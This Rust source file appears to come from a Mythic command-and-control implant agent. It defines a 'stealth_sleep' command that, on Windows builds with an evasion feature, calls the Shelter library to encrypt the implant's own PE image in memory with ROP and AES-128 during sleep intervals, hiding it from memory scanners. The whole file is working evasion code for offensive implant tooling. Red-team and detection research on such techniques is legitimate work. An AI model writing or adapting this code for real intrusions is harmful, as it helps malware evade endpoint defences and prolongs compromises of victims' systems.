// Sleep obfuscation via Shelter by @Kudaes (https://github.com/Kudaes/Shelter)
// Shelter encrypts the PE in memory using ROP + AES-128 during sleep intervals

use crate::{AgentTask, mythic_success, mythic_error};
use serde::Deserialize;
use std::error::Error;

#[derive(Deserialize)]
struct StealthSleepArgs {
    interval: Option<u64>,
    encrypt_pe: Option<bool>,
}

/// Obfuscated sleep — encrypts PE in memory during sleep when evasion feature is active
pub fn do_stealth_sleep(secs: u64) {
    #[cfg(all(feature = "evasion", target_os = "windows"))]
    {
        // Shelter::fluctuate(encrypt_all, delay_seconds, event_handle)
        // encrypt_all=true: encrypt entire PE including MZ headers
        // delay: sleep duration in seconds
        // event_handle: None for timer-based sleep
        let _ = shelter::fluctuate(true, Some(secs as u32), None);
    }

    #[cfg(not(all(feature = "evasion", target_os = "windows")))]
    {
        std::thread::sleep(std::time::Duration::from_secs(secs));
    }
}

/// Mythic command: stealth_sleep — explicit operator-controlled obfuscated sleep
pub fn stealth_sleep(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: StealthSleepArgs = serde_json::from_str(&task.parameters)?;
    let interval = args.interval.unwrap_or(5);
    let _encrypt_pe = args.encrypt_pe.unwrap_or(true);

    #[cfg(all(feature = "evasion", target_os = "windows"))]
    {
        let _ = shelter::fluctuate(_encrypt_pe, Some(interval as u32), None);
        Ok(mythic_success!(task.id, format!("Stealth sleep completed ({} seconds, pe_encrypted={})", interval, _encrypt_pe)))
    }

    #[cfg(not(all(feature = "evasion", target_os = "windows")))]
    {
        std::thread::sleep(std::time::Duration::from_secs(interval));
        Ok(mythic_success!(task.id, format!("Sleep completed ({} seconds, evasion not compiled)", interval)))
    }
}
